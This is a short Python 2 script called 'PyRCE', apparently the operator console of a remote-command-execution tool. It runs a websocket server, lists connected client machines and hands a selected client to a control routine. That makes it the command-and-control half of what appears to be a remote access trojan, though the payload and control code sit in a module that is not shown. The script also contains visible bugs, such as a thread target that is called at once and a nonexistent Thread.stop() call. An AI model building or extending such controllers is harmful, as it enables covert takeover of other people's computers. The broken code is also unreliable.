# -*- coding: utf-8 -*-


import signal
import sys
import threading
from sockets import WebsocketServer



if __name__ == "__main__":

    try:
        server = WebsocketServer("localhost", 1337)
        global listener_thread

        print "PyRCE - Commands: listen, list, control"
        while True:
            cmd = raw_input('>')
            if cmd == "listen":
                listener_thread = threading.Thread(target=server.listen())
                listener_thread.start()
            if cmd == "stop":
                listener_thread.stop()
            if cmd == "list":
                for i,c in enumerate(server.CLIENTS):
                    print "{}. {}".format(i+1, c['addr'])
            if cmd == "control":
                print "[?] Which client?"
                for i,c in enumerate(server.CLIENTS):
                    print "{}. {}".format(i+1, c['addr'])

                cmd = raw_input()

                client_socket = None
                try:
                    for i,c in enumerate(server.CLIENTS):
                        if i + 1 == int(cmd):
                            client_socket = c
                            server.control_client(c)
                            break
                except IOError as e:
                    print "[!!] Unable to connect to client."
                    print "[!!] Removing client from list."
                    server.CLIENTS.remove(client_socket)
                except Exception as e:
                    print "[!!] Unable to use this client."


    except KeyboardInterrupt:
        print "[*] Closing connection..."
        server.server.close()
